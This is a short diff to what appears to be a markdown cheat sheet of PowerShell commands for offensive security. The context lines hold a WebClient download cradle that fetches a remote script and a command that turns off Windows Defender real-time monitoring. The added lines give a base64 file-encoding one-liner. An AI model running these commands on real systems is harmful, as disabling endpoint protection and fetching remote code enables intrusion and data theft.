@@ -199,3 +199,8 @@ pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http:
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+
+## powershell - base64 encode & decode
+```
+[Convert]::ToBase64String((Get-Content -path "<host>" -Encoding byte))
+```
